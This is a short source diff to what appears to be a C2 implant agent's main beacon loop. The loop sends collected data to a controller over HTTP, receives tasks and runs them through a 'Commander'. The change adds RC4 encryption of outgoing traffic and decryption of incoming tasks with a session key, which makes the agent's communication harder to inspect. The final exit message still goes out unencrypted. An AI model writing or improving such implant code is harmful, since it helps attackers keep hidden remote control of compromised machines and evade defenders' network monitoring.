@@ -2,6 +2,7 @@
 #include "ApiLoader.h"
 #include "Commander.h"
 #include "utils.h"
+#include "Crypt.h"
 
 Agent*         g_Agent;
 ConnectorHTTP* g_Connector;
@@ -29,13 +30,22 @@ void AgentMain()
 	do {
 		if (packerOut->GetDataSize() > 4) {
 			packerOut->Set32(0, packerOut->GetDataSize());
-			recvData = g_Connector->SendData(packerOut->GetData(), packerOut->GetDataSize(), &recvDataSize);
+			
+			BYTE* data = packerOut->GetData();
+			ULONG dataSize = packerOut->GetDataSize();
+			EncryptRC4(data, dataSize, g_Agent->SessionKey, 16);
+
+			recvData = g_Connector->SendData( data, dataSize, &recvDataSize);
+			
 			packerOut->Clear();
 			packerOut->Pack32(0);
 		}
 		else {
 			recvData = g_Connector->SendData(NULL, 0, &recvDataSize);
 		}
+
+		if (recvData)
+			DecryptRC4(recvData, recvDataSize, g_Agent->SessionKey, 16);
 
 		g_Agent->commander->ProcessCommandTasks(recvData, recvDataSize, packerOut);
 		if (g_Agent->IsActive() && packerOut->GetDataSize() < 8 )
@@ -47,7 +57,11 @@ void AgentMain()
 	} while ( g_Agent->IsActive() );
 
 	g_Agent->commander->Exit(packerOut);
-	g_Connector->SendData(packerOut->GetData(), packerOut->GetDataSize(), &recvDataSize);
+
+	BYTE* data     = packerOut->GetData();
+	ULONG dataSize = packerOut->GetDataSize();
+
+	g_Connector->SendData(data, dataSize, &recvDataSize);
 	AgentClear(g_Agent->config->exit_method);
 }
 
